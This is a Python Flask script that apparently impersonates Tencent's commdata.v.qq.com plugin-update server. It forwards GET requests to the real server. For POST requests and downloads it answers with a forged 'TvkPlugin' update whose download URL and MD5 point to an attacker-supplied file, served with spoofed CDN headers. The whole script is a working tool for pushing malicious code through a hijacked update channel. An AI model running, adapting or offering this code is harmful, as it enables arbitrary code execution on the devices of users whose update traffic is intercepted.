import os
import json
import hashlib
import argparse
import requests
from flask import Flask, request, Response, send_file, make_response

FileHost = "commdata.v.qq.com"
FilePath = ""

app = Flask(__name__)

ResponseFail = Response("", status=404)


def CalculateMd5(filePath):
    if os.path.isfile(filePath):
        with open(filePath, "rb") as f:
            m = hashlib.md5()
            m.update(f.read())
            return m.hexdigest()
    else:
        return None


def ResponseGet(clientRequest):
    hostUrl = "http://commdata.v.qq.com/commdatav2?"
    subUrl = clientRequest.query_string.decode()
    fullUrl = hostUrl + subUrl

    headers = {
        "Connection": "Keep-Alive",
        "User-Agent": "Apache-HttpClient/UNAVAILABLE (java 1.4)"
    }
    realResponse = requests.get(fullUrl, headers=headers)

    resp = Response(realResponse.content, status=realResponse.status_code)
    for key, value in realResponse.headers.items():
        resp.headers[key] = value
    return resp


def ResponsePost():
    responseDict = {"c_so_name": "TvkPlugin",
                    "c_so_update_ver": "V4.3.200.1000",
                    "c_so_url": "http://{host}/qqmi/so/player/V4.3.200.1000/TvkPlugin_11646.zip".format(host=FileHost),
                    "c_so_md5": "{md5}".format(md5=CalculateMd5(FilePath)),
                    "ret": 0}
    responseContent = "QZOutputJson={data};".format(data=json.dumps(responseDict))

    headers = {
        "Server": "QZHTTP-2.38.20",
        "Connection": "keep-alive",
        "Content-Type": "application / x - javascript; charset = utf8",
        "Keep - Alive: timeout": "15, max = 1024",
        "X - Daa - Tunnel: hop_count": "1"
    }

    resp = Response(responseContent, headers=headers, status=200)
    return resp


@app.route('/commdatav2', methods=['POST', 'GET'])
def register():
    try:
        if request.method == 'GET':
            return ResponseGet(request)
        elif request.method == 'POST':
            return ResponsePost()
    except:
        return ResponseFail


@app.route('/qqmi/so/player/<version>/<file>', methods=['GET'])
def ResponseDownload(version, file):
    try:
        headers = {
            "Server": "TCDN_NWS",
            "Content-Type": "application / zip",
            "Content-Length": os.path.getsize(FilePath)
        }

        resp = make_response(send_file(FilePath, as_attachment=True))
        resp.headers = headers
        return resp
    except:
        return ResponseFail


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="")
    parser.add_argument("--filePath", default="")
    args = parser.parse_args()

    if not args.filePath or not os.path.isfile(args.filePath):
        print("{file} not exist!".format(file=args.filePath))
        return

    global FileHost
    global FilePath

    FileHost = args.host if args.host else FileHost
    FilePath = args.filePath

    app.run(host='0.0.0.0', port=80)


if __name__ == '__main__':
    main()
